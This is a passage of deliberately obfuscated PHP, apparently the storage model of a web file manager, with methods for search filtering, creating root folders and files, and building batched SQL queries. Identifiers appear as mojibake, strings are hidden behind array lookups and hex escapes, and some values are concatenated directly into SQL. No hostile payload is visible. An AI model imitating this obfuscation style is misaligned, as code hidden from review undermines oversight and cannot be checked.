$¸©·á¸û) !== !1) { $‡ó¯úŒ‡[] = $äÂ•Îü´[$‚Óğì£›[483]]; } } if (!$‡ó¯úŒ‡) { return; } $–Àâ›Ëµ = array($‚Óğì£›[508] => array($‚Óğì£›[7], $‡ó¯úŒ‡), $‚Óğì£›[1779] => 0, $‚Óğì£›[33] => $‚Óğì£›[2098] . $ó±ğş×); $–Æ ãğ¥ = Model($‚Óğì£›[510])->field($‚Óğì£›[87])->where($–Àâ›Ëµ)->select(); $–Æ ãğ¥ = array_to_keyvalue($–Æ ãğ¥, $‚Óğì£›[12], $‚Óğì£›[87]); $Ä¢¥¸„Š = array_unique($–Æ ãğ¥); $this->_listSearchMerge($Ìüâòõ‡, $ø”–ÑÓ®, $¸ñË…ç, $Ä¢¥¸„Š); } private function _listSearchMerge(&$«Åçƒ‘Ñ, $ñøÇ‡ò„, $±€ãÒ«è, $ñ‘ƒ«¡ ) { $Ü—£ŒÈ‹ =& $_SERVER[§Êá¸İ]; if (!$ñ‘ƒ«¡ ) { return; } $œ¯ØÁ = array_to_keyvalue($«Åçƒ‘Ñ[$Ü—£ŒÈ‹[445]], $Ü—£ŒÈ‹[12], $Ü—£ŒÈ‹[193]); $Àç€Ûôğ = array_diff($ñ‘ƒ«¡ , $œ¯ØÁ); if (!$Àç€Ûôğ) { return; } $ˆã´øÈ = array($Ü—£ŒÈ‹[193] => array($Ü—£ŒÈ‹[7], $Àç€Ûôğ)); $İ¨÷ÇÎ× = $this->field($±€ãÒ«è)->where($ˆã´øÈ)->select(); if (!$İ¨÷ÇÎ×) { return; } $¤ƒ²€ = array(); foreach ($İ¨÷ÇÎ× as $°úãİ•˜) { if ($this->_listSearchFilter($°úãİ•˜, $ñøÇ‡ò„)) { $¤ƒ²€[] = $°úãİ•˜; } } $«Åçƒ‘Ñ[$Ü—£ŒÈ‹[445]] = array_merge($¤ƒ²€, $«Åçƒ‘Ñ[$Ü—£ŒÈ‹[445]]); $«Åçƒ‘Ñ[$Ü—£ŒÈ‹[442]][$Ü—£ŒÈ‹[443]] += count($¤ƒ²€); } private function _listSearchFilter($Æ˜ïÕ», $ä¤»Œˆ‡) { $èúğˆäÀ =& $_SERVER[§Êá¸İ]; $ûÇ£ç  = $Æ˜ïÕ»[$èúğˆäÀ[493]] == $èúğˆäÀ[91]; if (!strstr($Æ˜ïÕ»[$èúğˆäÀ[592]], $èúğˆäÀ[50] . $ä¤»Œˆ‡[$èúğˆäÀ[192]] . $èúğˆäÀ[50])) { return !1; } if (isset($ä¤»Œˆ‡[$èúğˆäÀ[494]]) && $ä¤»Œˆ‡[$èúğˆäÀ[494]] != $èúğˆäÀ[863]) { if ($ä¤»Œˆ‡[$èúğˆäÀ[494]] == $èúğˆäÀ[78] && !$ûÇ£ç ) { return !1; } if ($ä¤»Œˆ‡[$èúğˆäÀ[494]] != $èúğˆäÀ[78] && $ûÇ£ç ) { return !1; } if (!strstr($Æ˜ïÕ»[$èúğˆäÀ[169]], $èúğˆäÀ[50] . $ä¤»Œˆ‡[$èúğˆäÀ[494]] . $èúğˆäÀ[50])) { return !1; } } if (isset($ä¤»Œˆ‡[$èúğˆäÀ[2246]]) && $ä¤»Œˆ‡[$èúğˆäÀ[2246]] < $Æ˜ïÕ»[$èúğˆäÀ[79]]) { return !1; } if (isset($ä¤»Œˆ‡[$èúğˆäÀ[2247]]) && $ä¤»Œˆ‡[$èúğˆäÀ[2247]] > $Æ˜ïÕ»[$èúğˆäÀ[79]]) { return !1; } if (isset($ä¤»Œˆ‡[$èúğˆäÀ[670]]) && $ä¤»Œˆ‡[$èúğˆäÀ[670]] != $Æ˜ïÕ»[$èúğˆäÀ[537]]) { return !1; } return !0; } public function listSearchChildren($µııïì, $à°ğôËò = 5000) { $ãÉ¸íÙ‡ =& $_SERVER[§Êá¸İ]; $ØâÙ¤¿ = array(); $â„¼ôèï = $this->sourceInfo($µııïì); $€‘äïÛ¾ = array($ãÉ¸íÙ‡[592] => array($ãÉ¸íÙ‡[459], $â„¼ôèï[$ãÉ¸íÙ‡[592]] . $â„¼ôèï[$ãÉ¸íÙ‡[193]] . $ãÉ¸íÙ‡[621])); $û¦ì½Òä = $this->field($ãÉ¸íÙ‡[79])->where($€‘äïÛ¾)->limit($à°ğôËò + 1)->select(); $úÇÄµÊï = is_array($û¦ì½Òä) ? count($û¦ì½Òä) : 0; if ($úÇÄµÊï > $à°ğôËò) { return $this->_listSearchChildrenNear($µııïì, $à°ğôËò); } $Ã¾‘ûñæ = $this->field($ãÉ¸íÙ‡[193])->where($€‘äïÛ¾)->select(); $ØâÙ¤¿ = array_to_keyvalue($Ã¾‘ûñæ, $ãÉ¸íÙ‡[12], $ãÉ¸íÙ‡[193]); return $ØâÙ¤¿; } private function _listSearchChildrenNear($ƒ³ğ¤ó, $ñº€’áÕ) { $ÍˆÜŸè =& $_SERVER[§Êá¸İ]; $öÇï„…ı = array(); $Ææ°È€Õ = array($ÍˆÜŸè[192] => $ƒ³ğ¤ó); $›Ü± ò = $this->field($ÍˆÜŸè[2248])->where($Ææ°È€Õ)->select(); $Ö¯·¼·Ä = array_to_keyvalue(array_filter_by_field($›Ü± ò, $ÍˆÜŸè[493], $ÍˆÜŸè[91]), $ÍˆÜŸè[12], $ÍˆÜŸè[193]); $öÇï„…ı = array_merge($öÇï„…ı, array_to_keyvalue($›Ü± ò, $ÍˆÜŸè[12], $ÍˆÜŸè[193])); if (!$Ö¯·¼·Ä) { return $öÇï„…ı; } $Ææ°È€Õ = array($ÍˆÜŸè[192] => array($ÍˆÜŸè[7], $Ö¯·¼·Ä)); $›Ü± ò = $this->field($ÍˆÜŸè[2248])->where($Ææ°È€Õ)->limit($ñº€’áÕ)->select(); $öÇï„…ı = array_merge($öÇï„…ı, array_to_keyvalue($›Ü± ò, $ÍˆÜŸè[12], $ÍˆÜŸè[193])); $öÇï„…ı = array_slice($öÇï„…ı, 0, intval($ñº€’áÕ)); return $öÇï„…ı; } private function _listSearchBindPinyin($œ©íÃÚÀ, &$ü°ÛÓ¤‚, &$”õ–ãş) { $¹Ê½ñÑ“ =& $_SERVER[§Êá¸İ]; if (!isset($œ©íÃÚÀ[$¹Ê½ñÑ“[2076]]) || !$œ©íÃÚÀ[$¹Ê½ñÑ“[2076]]) { return; } if (!Input::check($œ©íÃÚÀ[$¹Ê½ñÑ“[2076]], $¹Ê½ñÑ“[394]) || strlen($œ©íÃÚÀ[$¹Ê½ñÑ“[2076]]) < 2) { return; } $ñî“ = "\x4c\x45\106\124\x20\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\151\x6f\x5f\x73\x6f\x75\x72\143\145\x5f\x6d\145\x74\141\40\155\x65\x74\x61\x20\157\156\40\x73\157\x75\162\x63\x65\x2e\163\157\x75\x72\x63\x65\x49\x44\x20\75\40\155\145\164\x61\x2e\163\x6f\x75\162\x63\x65\x49\x44"; $Í³ƒÓƒØ = array(); $”õ–ãş = str_replace(array($¹Ê½ñÑ“[262], $¹Ê½ñÑ“[53], $¹Ê½ñÑ“[2249]), $¹Ê½ñÑ“[12], $”õ–ãş); $”õ–ãş = $¹Ê½ñÑ“[519] . str_replace($¹Ê½ñÑ“[50], $¹Ê½ñÑ“[520], $”õ–ãş); $Şê®¾¡Ç = $ü°ÛÓ¤‚[$¹Ê½ñÑ“[32]]; unset($ü°ÛÓ¤‚[$¹Ê½ñÑ“[32]]); foreach ($ü°ÛÓ¤‚ as $ÙÛú¥®Ê => $ù®ä²ØŞ) { $Í³ƒÓƒØ[$¹Ê½ñÑ“[519] . $ÙÛú¥®Ê] = $ù®ä²ØŞ; } foreach ($Şê®¾¡Ç as $õùŒ’) { $Í³ƒÓƒØ[] = array($¹Ê½ñÑ“[524] => $õùŒ’, $¹Ê½ñÑ“[1088] => $¹Ê½ñÑ“[2080], array($¹Ê½ñÑ“[2250] => $õùŒ’, $¹Ê½ñÑ“[2251] => array($¹Ê½ñÑ“[7], array($¹Ê½ñÑ“[546], $¹Ê½ñÑ“[545])))); } $this->join($ñî“); $ü°ÛÓ¤‚ = $Í³ƒÓƒØ; } private function _parseSearchWhere($Îû£Ã¡Ê) { $‡ˆ÷‚“ =& $_SERVER[§Êá¸İ]; $¸ÑŒå¨ = array(); if (isset($Îû£Ã¡Ê[$‡ˆ÷‚“[847]]) && $Îû£Ã¡Ê[$‡ˆ÷‚“[847]]) { $¸ÑŒå¨[$‡ˆ÷‚“[88]] = array($‡ˆ÷‚“[2252], $Îû£Ã¡Ê[$‡ˆ÷‚“[847]]); } if (isset($Îû£Ã¡Ê[$‡ˆ÷‚“[848]]) && $Îû£Ã¡Ê[$‡ˆ÷‚“[848]]) { $ßğˆõº¹ = array($‡ˆ÷‚“[2253], $Îû£Ã¡Ê[$‡ˆ÷‚“[848]]); if ($¸ÑŒå¨[$‡ˆ÷‚“[88]]) { $¸ÑŒå¨[$‡ˆ÷‚“[88]] = array($¸ÑŒå¨[$‡ˆ÷‚“[88]], $ßğˆõº¹, $‡ˆ÷‚“[2254]); } else { $¸ÑŒå¨[$‡ˆ÷‚“[88]] = $ßğˆõº¹; } } if (isset($Îû£Ã¡Ê[$‡ˆ÷‚“[2246]]) && $Îû£Ã¡Ê[$‡ˆ÷‚“[2246]] > 0) { $¸ÑŒå¨[$‡ˆ÷‚“[79]] = array($‡ˆ÷‚“[2252], $Îû£Ã¡Ê[$‡ˆ÷‚“[2246]]); } if (isset($Îû£Ã¡Ê[$‡ˆ÷‚“[2247]]) && $Îû£Ã¡Ê[$‡ˆ÷‚“[2247]]) { $ßğˆõº¹ = array($‡ˆ÷‚“[2253], $Îû£Ã¡Ê[$‡ˆ÷‚“[2247]]); if ($¸ÑŒå¨[$‡ˆ÷‚“[79]]) { $¸ÑŒå¨[$‡ˆ÷‚“[79]] = array($¸ÑŒå¨[$‡ˆ÷‚“[79]], $ßğˆõº¹, $‡ˆ÷‚“[2254]); } else { $¸ÑŒå¨[$‡ˆ÷‚“[79]] = $ßğˆõº¹; } } if (isset($Îû£Ã¡Ê[$‡ˆ÷‚“[670]]) && $Îû£Ã¡Ê[$‡ˆ÷‚“[670]]) { $¸ÑŒå¨[] = array($‡ˆ÷‚“[537] => $Îû£Ã¡Ê[$‡ˆ÷‚“[670]], $‡ˆ÷‚“[535] => $Îû£Ã¡Ê[$‡ˆ÷‚“[670]], $‡ˆ÷‚“[1088] => $‡ˆ÷‚“[2080]); } if (isset($Îû£Ã¡Ê[$‡ˆ÷‚“[494]]) && $Îû£Ã¡Ê[$‡ˆ÷‚“[494]]) { $´ìÔ”ßº = $Îû£Ã¡Ê[$‡ˆ÷‚“[494]]; if ($´ìÔ”ßº == $‡ˆ÷‚“[78]) { $¸ÑŒå¨[$‡ˆ÷‚“[493]] = 1; } else { if ($´ìÔ”ßº == $‡ˆ÷‚“[2255]) { $¸ÑŒå¨[$‡ˆ÷‚“[493]] = 0; } else { if ($´ìÔ”ßº) { $´ìÔ”ßº = is_array($´ìÔ”ßº) ? $´ìÔ”ßº : explode($‡ˆ÷‚“[50], $´ìÔ”ßº); $¸ÑŒå¨[$‡ˆ÷‚“[494]] = array($‡ˆ÷‚“[500], $´ìÔ”ßº); $¸ÑŒå¨[$‡ˆ÷‚“[493]] = 0; } } } } $this->_parseSearchParent($Îû£Ã¡Ê, $¸ÑŒå¨); if (isset($Îû£Ã¡Ê[$‡ˆ÷‚“[2076]]) && trim($Îû£Ã¡Ê[$‡ˆ÷‚“[2076]])) { $…Ó»çÃî = trim($Îû£Ã¡Ê[$‡ˆ÷‚“[2076]]); $®»à‘õ´ = explode($‡ˆ÷‚“[53], $…Ó»çÃî); if (strlen($…Ó»çÃî) > 2 && (substr($…Ó»çÃî, 0, 1) == $‡ˆ÷‚“[121] && substr($…Ó»çÃî, -1) == $‡ˆ÷‚“[121]) || substr($…Ó»çÃî, 0, 1) == $‡ˆ÷‚“[58] && substr($…Ó»çÃî, -1) == $‡ˆ÷‚“[58]) { $…Ó»çÃî = substr($…Ó»çÃî, 1, -1); $®»à‘õ´ = array($…Ó»çÃî); } $¸ÑŒå¨[$‡ˆ÷‚“[32]] = array(array($‡ˆ÷‚“[620], $‡ˆ÷‚“[2078] . $…Ó»çÃî . $‡ˆ÷‚“[2078])); if (count($®»à‘õ´) > 1) { $¸ÑŒå¨[$‡ˆ÷‚“[32]] = array(); foreach ($®»à‘õ´ as $Î°á°ç) { if (!trim($Î°á°ç)) { continue; } $¸ÑŒå¨[$‡ˆ÷‚“[32]][] = array($‡ˆ÷‚“[620], $‡ˆ÷‚“[2078] . trim($Î°á°ç) . $‡ˆ÷‚“[2078]); } } } return $¸ÑŒå¨; } private function _parseSearchParent($ğòáÆç, &$ãÖ×ß‰) { $ÊĞ®ë¾ñ =& $_SERVER[§Êá¸İ]; if (!isset($ğòáÆç[$ÊĞ®ë¾ñ[192]]) || !$ğòáÆç[$ÊĞ®ë¾ñ[192]]) { return; } $ßÀ©…¬ = $this->pathInfo($ğòáÆç[$ÊĞ®ë¾ñ[192]]); $¦›ŸìıØ = $ßÀ©…¬[$ÊĞ®ë¾ñ[192]] . $ÊĞ®ë¾ñ[12] === $ÊĞ®ë¾ñ[228]; $ÚÂÁ©§ı = $ßÀ©…¬[$ÊĞ®ë¾ñ[190]] == $ÊĞ®ë¾ñ[586]; if ($ßÀ©…¬[$ÊĞ®ë¾ñ[603]] == $ÊĞ®ë¾ñ[604]) { $¾“£¦Ò– = $this->sourceInfo($ğòáÆç[$ÊĞ®ë¾ñ[192]]); $ßÀ©…¬[$ÊĞ®ë¾ñ[592]] = $¾“£¦Ò–[$ÊĞ®ë¾ñ[592]]; } $ãÖ×ß‰[$ÊĞ®ë¾ñ[660]] = array($ÊĞ®ë¾ñ[620], $ßÀ©…¬[$ÊĞ®ë¾ñ[592]] . $ğòáÆç[$ÊĞ®ë¾ñ[192]] . $ÊĞ®ë¾ñ[621]); $’²Ø“ŒÅ = isset($ğòáÆç[$ÊĞ®ë¾ñ[1936]]) && in_array($ÊĞ®ë¾ñ[586], $ğòáÆç[$ÊĞ®ë¾ñ[1936]]); if (!$’²Ø“ŒÅ || !$ÚÂÁ©§ı || !$¦›ŸìıØ || !$ßÀ©…¬[$ÊĞ®ë¾ñ[495]]) { return; } if (!AuthModel::authCheckRoot($ßÀ©…¬[$ÊĞ®ë¾ñ[495]][$ÊĞ®ë¾ñ[496]])) { return; } $‰œ‡Ë÷· = $ßÀ©…¬[$ÊĞ®ë¾ñ[577]] . $ÊĞ®ë¾ñ[12]; if ($‰œ‡Ë÷· == $ÊĞ®ë¾ñ[91]) { unset($ãÖ×ß‰[$ÊĞ®ë¾ñ[660]]); $ãÖ×ß‰[$ÊĞ®ë¾ñ[190]] = self::TYPE_GROUP; return; } $›°ÇğÖ¨ = Model($ÊĞ®ë¾ñ[593])->groupChildrenAll($‰œ‡Ë÷·); $„âıµ›î = count($›°ÇğÖ¨); if ($„âıµ›î <= 1) { return; } $ÄÏõ»èÈ = array($ÊĞ®ë¾ñ[192] => 0, $ÊĞ®ë¾ñ[190] => self::TYPE_GROUP, $ÊĞ®ë¾ñ[577] => array($ÊĞ®ë¾ñ[7], $›°ÇğÖ¨)); $Ó‚£ğ£‰ = $this->field($ÊĞ®ë¾ñ[2256])->where($ÄÏõ»èÈ)->limit($„âıµ›î)->select(); $ãÖ×ß‰[$ÊĞ®ë¾ñ[660]] = array(); foreach ($Ó‚£ğ£‰ as $şà¸í†ç) { $ãÖ×ß‰[$ÊĞ®ë¾ñ[660]][] = array($ÊĞ®ë¾ñ[620], $ÊĞ®ë¾ñ[602] . $şà¸í†ç[$ÊĞ®ë¾ñ[193]] . $ÊĞ®ë¾ñ[621]); } $ãÖ×ß‰[$ÊĞ®ë¾ñ[660]][] = $ÊĞ®ë¾ñ[2080]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Ç¥Õİù») { $¬ÀŠàìá =& $_SERVER[§Êá¸İ]; $û ê›Ğï = Model($¬ÀŠàìá[585])->where(array($¬ÀŠàìá[1770] => $Ç¥Õİù»))->find(); $ÍÒÃŠ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ç¥Õİù», $û ê›Ğï[$¬ÀŠàìá[32]]); $this->userDesktopAdd($ÍÒÃŠ); return $ÍÒÃŠ; } public function userDesktopAdd($˜³È„¬) { $Æ¯¦£ÜÕ =& $_SERVER[§Êá¸İ]; $ØÆ‘ù³é = LNG($Æ¯¦£ÜÕ[2257]); $ ¿İƒ§ = $this->mkdir($˜³È„¬, $ØÆ‘ù³é); $this->metaSet($ ¿İƒ§, $Æ¯¦£ÜÕ[2258], $Æ¯¦£ÜÕ[91]); $this->metaSet($˜³È„¬, $Æ¯¦£ÜÕ[2259], $ ¿İƒ§); } public function userPathSafeAdd($¡˜©âíè) { $ãì©õ‡‚ =& $_SERVER[§Êá¸İ]; $—¼—¥–» = Model($ãì©õ‡‚[585])->getInfoFull($¡˜©âíè); if (!$—¼—¥–») { return !1; } if (_get($—¼—¥–», $ãì©õ‡‚[607])) { return $—¼—¥–»[$ãì©õ‡‚[547]][$ãì©õ‡‚[2260]]; } $°»‹£‚ = $this->_mkdirRoot(SourceModel::TYPE_USER, $¡˜©âíè, $ãì©õ‡‚[2261], $ãì©õ‡‚[514]); Model($ãì©õ‡‚[585])->metaSet($¡˜©âíè, $ãì©õ‡‚[2260], $°»‹£‚); $this->metaSet($°»‹£‚, $ãì©õ‡‚[2262], $¡˜©âíè); return $°»‹£‚; } public function groupRootAdd($´ÏÃ‘âÜ) { $§ÅâšÈÃ =& $_SERVER[§Êá¸İ]; $†ÕûÎ  = Model($§ÅâšÈÃ[593])->where(array($§ÅâšÈÃ[2070] => $´ÏÃ‘âÜ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $´ÏÃ‘âÜ, $†ÕûÎ [$§ÅâšÈÃ[32]]); } public function systemRootPathAdd($§çÑ…—Æ) { if ($§çÑ…—Æ != $_SERVER[§Êá¸İ][613]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $§çÑ…—Æ); } public function userRootRemove($˜Ÿ« ¦) { $•ƒËéó¾ = $this->targetSourceRoot(SourceModel::TYPE_USER, $˜Ÿ« ¦, !0); foreach ($•ƒËéó¾ as $Ï€¸¶Æ¤) { if (!$Ï€¸¶Æ¤) { continue; } $this->remove($Ï€¸¶Æ¤[$_SERVER[§Êá¸İ][193]], !1); } } public function groupRootRemove($Â´‚ŸçÕ) { $ïÉêÊ•§ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $Â´‚ŸçÕ); if (!$ïÉêÊ•§) { return; } $this->remove($ïÉêÊ•§[$_SERVER[§Êá¸İ][193]], !1); } private function _mkdirRoot($İø˜«¡Ğ, $‡ï©‰¾ô, $¬ÍÇºÎ, $·…­š¨î = '') { $¨ÁìÅÆ… =& $_SERVER[§Êá¸İ]; $ïÏßåõ— = defined($¨ÁìÅÆ…[2204]) ? USER_ID : 0; $ö×¦ğéş = array($¨ÁìÅÆ…[485] => 0, $¨ÁìÅÆ…[656] => $İø˜«¡Ğ, $¨ÁìÅÆ…[657] => $‡ï©‰¾ô, $¨ÁìÅÆ…[654] => 1, $¨ÁìÅÆ…[658] => $ïÏßåõ—, $¨ÁìÅÆ…[659] => $ïÏßåõ—, $¨ÁìÅÆ…[655] => $·…­š¨î, $¨ÁìÅÆ…[660] => $¨ÁìÅÆ…[602], $¨ÁìÅÆ…[512] => 0, $¨ÁìÅÆ…[625] => 0, $¨ÁìÅÆ…[550] => 0, $¨ÁìÅÆ…[661] => $¨ÁìÅÆ…[12]); if ($ÖıÖñåá = $this->where($ö×¦ğéş)->find()) { return $ÖıÖñåá[$¨ÁìÅÆ…[193]]; } $å†Ä¬ = "\x4d\157\144\x65\x6c\123\x6f\x75\162\x63\x65\x2e\x6d\x6b\x64\151\162\122\x6f\157\164\x2e{$İø˜«¡Ğ}\x2e{$‡ï©‰¾ô}\56" . $¬ÍÇºÎ; CacheLock::lock($å†Ä¬); $ö×¦ğéş[$¨ÁìÅÆ…[32]] = $¬ÍÇºÎ; $€’‡‚»Ç = $this->add($ö×¦ğéş); $öœÛ½ï‚ = array($¨ÁìÅÆ…[662] => short_id($€’‡‚»Ç)); $this->where(array($¨ÁìÅÆ…[499] => $€’‡‚»Ç))->save($öœÛ½ï‚); CacheLock::unlock($å†Ä¬); return $€’‡‚»Ç; } private function targetSourceRoot($¸€ıÙÇˆ, $óùÒ–¼å, $çƒïÛñº = false) { $ÔÛó‚É =& $_SERVER[§Êá¸İ]; $´Š²Ó““ = array($ÔÛó‚É[485] => 0, $ÔÛó‚É[656] => $¸€ıÙÇˆ, $ÔÛó‚É[657] => $óùÒ–¼å); if ($çƒïÛñº) { $”ôŒ›ìı = $this->where($´Š²Ó““)->select(); return $”ôŒ›ìı ? $”ôŒ›ìı : array(); } $ª¢ùùîÎ = $this->where($´Š²Ó““)->find(); return $ª¢ùùîÎ ? $ª¢ùùîÎ : array(); } public function sourceRootGroup($æ¸”™) { $óê«¥çş =& $_SERVER[§Êá¸İ]; if (is_string($æ¸”™)) { $æ¸”™ = array($æ¸”™); } $ùçˆëó¿ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $æ¸”™, $óê«¥çş[220]); $µ™¨¸Ç“ = array($óê«¥çş[445] => $ùçˆëó¿, $óê«¥çş[442] => array($óê«¥çş[845] => count($æ¸”™))); $this->_listDataApply($µ™¨¸Ç“[$óê«¥çş[445]]); $this->_listMake($µ™¨¸Ç“); return array_to_keyvalue($µ™¨¸Ç“[$óê«¥çş[85]], $óê«¥çş[577]); } public function mkfile($­ÃÂş»Ê, $–Ó¤œ¯Ü, $ÀÀªÂÌì = '', $ƒñˆÁ˜ö = REPEAT_RENAME) { $´ØÌü =& $_SERVER[§Êá¸İ]; $â–íµË’ = Model($´ØÌü[682])->addFileByContent($ÀÀªÂÌì, $–Ó¤œ¯Ü); return $this->_createFileCall($­ÃÂş»Ê, $–Ó¤œ¯Ü, $â–íµË’, $ƒñˆÁ˜ö, $´ØÌü[1438]); } public function addFile($Õ“»£çÒ, $ºŞªï…ò, $›ı›ÁŸ, $ÜÑŸÒåá = false, $½Ç§´™ = REPEAT_RENAME) { $‘âê‘œÕ = Model($_SERVER[§Êá¸İ][682])->addFile($ºŞªï…ò, $›ı›ÁŸ, $ÜÑŸÒåá); return $this->_createFileCall($Õ“»£çÒ, $›ı›ÁŸ, $‘âê‘œÕ, $½Ç§´™); } public function addFileByFileID($ÚšÍ”‚û, $Åƒò—¤¿, $ŞÉğÜ‰¶, $¥‰æ‹É = REPEAT_RENAME) { $ÒÎê´ëâ =& $_SERVER[§Êá¸İ]; $‰´†²ƒÃ = Model($ÒÎê´ëâ[682])->find($Åƒò—¤¿); Model($ÒÎê´ëâ[682])->linkAdd($Åƒò—¤¿); return $this->_createFileCall($ÚšÍ”‚û, $ŞÉğÜ‰¶, $‰´†²ƒÃ, $¥‰æ‹É); } public function addFileByRemote($´ø‚”Ü, $ÇŞÙŸª , $µ“£Œ¡, $®Ø«”Ó‡ = array(), $ùûœ©Ö = REPEAT_RENAME) { $ùœÖõûÈ = Model($_SERVER[§Êá¸İ][682])->addFileByRemote($ÇŞÙŸª , $µ“£Œ¡, $®Ø«”Ó‡); return $this->_createFileCall($´ø‚”Ü, $µ“£Œ¡, $ùœÖõûÈ, $ùûœ©Ö); } private function _createFileCall($î·ÊÔ¹—, $¯“·ÊÉß, $ñäÒ¦†í, $¶«À¨œ, $ôÏà¯«Ë = "\x75\x70\154\x6f\141\144") { $£€íÖĞÎ =& $_SERVER[§Êá¸İ]; $ğ§«™Š® = !1; $this->setMasterDB(); $this->lockWriteStart($î·ÊÔ¹—, $¯“·ÊÉß); $ÕòáÆ = $this->fileNameExist($î·ÊÔ¹—, $¯“·ÊÉß); $¤§·İ³ş = $this->_createFile($î·ÊÔ¹—, $¯“·ÊÉß, $ñäÒ¦†í, $¶«À¨œ, $ğ§«™Š®); if (!$ğ§«™Š®) { Model($£€íÖĞÎ[552])->remove($ñäÒ¦†í[$£€íÖĞÎ[549]]); } if ($ğ§«™Š® && $¤§·İ³ş && $¤§·İ³ş != $ÕòáÆ) { Model($£€íÖĞÎ[2230])->eventCreate($¤§·İ³ş, $ôÏà¯«Ë); } $this->lockWriteEnd($î·ÊÔ¹—, $¯“·ÊÉß); return $¤§·İ³ş; } public function mkdir($ûĞç‚Ñ», $ºûûé£Ã, $Í‹ÈÈƒù = REPEAT_SKIP) { $ë–¼¦àø =& $_SERVER[§Êá¸İ]; $this->setMasterDB(); $£‡üÉòÇ = $this->sourceInfo($ûĞç‚Ñ»); if (!$£‡üÉòÇ) { return !1; } $this->lockWriteStart($ûĞç‚Ñ», $ºûûé£Ã); if ($Í‹ÈÈƒù !== !1) { $ñ‚ğ·À˜ = $this->fileNameExist($ûĞç‚Ñ», $ºûûé£Ã); if ($ñ‚ğ·À˜ && $Í‹ÈÈƒù != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ûĞç‚Ñ», $ºûûé£Ã); return $ñ‚ğ·À˜; } $ºûûé£Ã = $this->fileNameAuto($ûĞç‚Ñ», $ºûûé£Ã, $Í‹ÈÈƒù); } $ê¶ÔŒİ¤ = array($ë–¼¦àø[654] => 1, $ë–¼¦àø[502] => $ºûûé£Ã, $ë–¼¦àø[655] => $ë–¼¦àø[12], $ë–¼¦àø[550] => 0, $ë–¼¦àø[625] => 0); $°¿¯œ¬Ş = $this->_addSource($ê¶ÔŒİ¤, $£‡üÉòÇ); Model($ë–¼¦àø[2230])->eventCreate($°¿¯œ¬Ş, $ë–¼¦àø[1439]); $this->lockWriteEnd($ûĞç‚Ñ», $ºûûé£Ã); return $°¿¯œ¬Ş; } public function listSourceRoot($æ‚»ÂƒÍ, $ïØÅ¦İ, $ˆ€âÙä¥ = "\x73\157\165\162\143\145\x49\x44\54\x74\x61\x72\x67\145\x74\x49\x44\54\163\151\x7a\145") { $Ìè•Ÿ¶Á =& $_SERVER[§Êá¸İ]; $Ş·È³ä = $Ìè•Ÿ¶Á[454]; $Ñ¤ÈĞº† = array(); $½²¼¿ = 1024 * 50; $²´§Îµ÷ = is_array($²´§Îµ÷) ? $²´§Îµ÷ : array(); $Õ×Ü©ış = count($ïØÅ¦İ); $ù“óØ¾‘ = $this->tablePrefix . $Ìè•Ÿ¶Á[2263]; for ($ö›³¶Óß = 0; $ö›³¶Óß < $Õ×Ü©ış; $ö›³¶Óß++) { $ŸÉ¸ŠëÌ = $ïØÅ¦İ[$ö›³¶Óß]; $Ş·È³ä .= "\123\105\x4c\105\x43\x54\x20\x2a\40\x46\122\x4f\x4d\40\x28\123\105\x4c\x45\x43\124\x20{$ˆ€âÙä¥}\x20\106\x52\117\x4d\40\140{$ù“óØ¾‘}\x60\40\x57\x48\105\122\x45\40"; $Ş·È³ä .= "\140\160\x61\x72\145\x6e\x74\x49\x44\140\x3d\60\40\101\x4e\104\x20\140\x74\x61\162\147\x65\164\x49\x44\x60\x3d{$ŸÉ¸ŠëÌ}\40\x41\116\104\40\140\164\141\x72\147\x65\x74\x54\x79\160\x65\140\75{$æ‚»ÂƒÍ}\x20\x61\x6e\144\40\x66\151\154\x65\x54\x79\x70\x65\75\x27\x27\x20\x6c\x69\155\151\164\x20\61\x29\x20\141\163\x20\x74\142\137{$ö›³¶Óß}\40\125\x4e\x49\x4f\x4e\x20\101\x4c\x4c\x20"; if ((strlen($Ş·È³ä) >= $½²¼¿ || $ö›³¶Óß == $Õ×Ü©ış - 1) && $Ş·È³ä) { $Ş·È³ä = substr($Ş·È³ä, 0, -strlen($Ìè•Ÿ¶Á[1126])); $úÊÁèæÙ = $this->query($Ş·È³ä); $Ş·È³ä = $Ìè•Ÿ¶Á[12]; $Ñ¤ÈĞº† = array_merge($Ñ¤ÈĞº†, $úÊÁèæÙ); } } return $Ñ¤ÈĞº†; } private function _createFile($Û¯·Ÿã«, $Û…€¨†, $™°ßá¼Õ, $ˆâì‘ÄŠ, &$›Ó˜°Õ¸) { $Ûö¥óÓó =& $_SERVER[§Êá¸İ]; $šƒ©õ«Ø = $this->sourceInfo($Û¯·Ÿã«); if (!$™°ßá¼Õ || !$šƒ©õ«Ø) { return !1; } if ($ˆâì‘ÄŠ !== !1) { $Ôğ²…ØÁ = $this->fileNameExist($Û¯·Ÿã«, $Û…€¨†); } $›Ó˜°Õ¸ = !0; if ($ˆâì‘ÄŠ && $Ôğ²…ØÁ) { if ($ˆâì‘ÄŠ == REPEAT_SKIP) { $›Ó˜°Õ¸ = !1; return $Ôğ²…ØÁ; } else { if ($ˆâì‘ÄŠ == REPEAT_REPLACE) { $±•óµ×š = $this->sourceInfo($Ôğ²…ØÁ); $ú£¬Ë‚Ğ = $this->fileHistory($±•óµ×š, $™°ßá¼Õ[$Ûö¥óÓó[549]], $™°ßá¼Õ[$Ûö¥óÓó[79]]); if (!$ú£¬Ë‚Ğ) { $›Ó˜°Õ¸ = !1; } else { $this->folderSizeReset($Û¯·Ÿã«); } return $Ôğ²…ØÁ; } else { $Û…€¨† = $this->fileNameAuto($Û¯·Ÿã«, $Û…€¨†, $ˆâì‘ÄŠ, !1); } } } $¶˜ŠÄœü = array($Ûö¥óÓó[654] => 0, $Ûö¥óÓó[502] => $Û…€¨†, $Ûö¥óÓó[655] => substr(get_path_ext($Û…€¨†), 0, 10), $Ûö¥óÓó[550] => $™°ßá¼Õ[$Ûö¥óÓó[549]], $Ûö¥óÓó[625] => $™°ßá¼Õ[$Ûö¥óÓó[79]]); $ÍšâÃË = $this->_addSource($¶˜ŠÄœü, $šƒ©õ«Ø); $this->folderSizeReset($Û¯·Ÿã«, 